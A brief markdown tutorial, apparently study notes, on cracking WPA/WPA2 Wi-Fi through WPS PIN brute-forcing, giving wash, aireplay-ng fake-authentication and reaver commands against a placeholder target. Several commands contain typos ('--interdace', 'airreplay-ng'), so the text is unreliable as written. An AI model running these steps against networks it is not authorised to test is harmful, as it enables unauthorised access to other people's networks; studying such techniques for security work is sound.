# Introduction to WPA/WPA2 cracking

WPA and WPA2 are other methods of data encryption which were implemented after the vulnerabilities in WEP were exposed.

They use different kind of data encryption algorithms.

WPS is a button that comes along with many of these devices, if the device is WPS enabled then we do not need to follow the traditional method of cracking a WPA/WPA2 network using a wordlist


## **Method 1: Without using a wordlist**

> The first step is to check which networks are WPS enabled. 
> To do that, run the following command in monitor mode
> - `wash --interdace wlan0`
> - Next step is to do a fakeauth attack to associate with the network
> - `airreplay-ng --fakeauth 30 -a :::::(target) -h :::::(wireless adapter) wlan0`
> - Open a different terminal and run reaver
> - `reaver --bssid ::::: --channel 1 --interface wlan0 -vvv --no-associate`
> - > reaver is a program that will bruteforce every single pin possible for wps attacks
> - `-vvv` gives us all the required information
> - `--no-associate` because we are already associrating with the network using a fakeauth and reaver's auth sometimes does not work properly